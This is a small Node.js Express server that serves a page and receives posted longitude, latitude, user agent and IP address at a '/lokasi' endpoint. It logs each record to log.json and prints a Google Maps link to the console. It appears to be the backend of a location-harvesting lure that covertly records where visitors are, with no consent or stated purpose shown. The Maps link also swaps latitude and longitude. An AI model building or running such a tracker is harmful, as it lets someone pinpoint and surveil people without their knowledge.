const express = require('express');
const path = require('path');
const fs = require('fs')
const app = express();
const port = 5000;

// app.use('/template', express.static(path.join(__dirname, 'template')));

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/lokasi', (req, res) => {
    const { longitude,latitude,userAgent,ip} = req.body;
    const data = {
        "longitude" : longitude,
        "latitude" : latitude,
        "userAgent" : userAgent,
        "ip" : ip
    }
    const dataString = JSON.stringify(data)
    fs.appendFile('log.json',dataString + "\n",(error)=>{
        if (error){
            console.error(error)
            res.sendStatus(404)
        }else{
            console.log("Longitude: " + longitude);
            console.log("Latitude : " + latitude);
            console.log("userAgent: "+ userAgent)
            console.log("ip: "+ip)
            console.log(`link: https://www.google.com/maps/place/@${longitude},${latitude},17z/data=!3m1!4b1!4m6!3m5!1s0x2dd7e5aee3aa2c79:0x615d87c4fe6ed0d6!8m2!3d-7.3927669!4d112.7737068!16s%2Fg%2F11b6jghh4n?entry=ttu`)
            res.sendStatus(200);
        }
    })
});

app.listen(port, () => {
    console.log(`server Status [${port}] active [http://localhost:${port}]`);
});
